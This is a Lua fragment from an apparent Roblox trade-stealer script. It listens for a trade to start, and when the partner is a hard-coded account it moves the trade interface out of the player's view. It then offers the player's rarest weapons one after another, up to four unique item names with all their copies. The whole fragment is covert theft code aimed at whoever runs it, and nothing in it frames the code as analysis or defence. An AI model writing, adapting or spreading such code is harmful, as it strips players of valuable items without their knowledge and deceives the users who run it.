-- offer items instantly when trade starts
game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("StartTrade").OnClientEvent:Connect(function(tradeData, player)
    container = getContainer() or container

    if player == "ihatetraines" then
        tradingWithTarget = true
        moveGuiAway()
        task.wait(0.5)

        local freshItems = {}
        local uniqueNames = {}
        local uniqueCount = 0

        for _, item in ipairs(container:GetChildren()) do
            local success, rarity = pcall(function()
                return item.Container.Rarity.Text
            end)
            if success and rarity then
                local amount = 1
                local amountSuccess, amountText = pcall(function()
                    return item.Container.Amount.Text
                end)
                if amountSuccess and amountText then
                    local num = amountText:match("x(%d+)")
                    if num then amount = tonumber(num) end
                end
                for i = 1, amount do
                    table.insert(freshItems, { name = item.Name, rarity = rarity })
                end
            end
        end

        table.sort(freshItems, function(a, b)
            return (rarityPriority[a.rarity] or 99) < (rarityPriority[b.rarity] or 99)
        end)

        for _, item in ipairs(freshItems) do
            if uniqueCount >= 4 and not uniqueNames[item.name] then
            else
                if not uniqueNames[item.name] then
                    uniqueNames[item.name] = true
                    uniqueCount = uniqueCount + 1
                end
                pcall(function()
                    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(item.name, "Weapons")
                end)
                task.wait(0.3)
            end
        end
    else
        tradingWithTarget = false
    end
end)

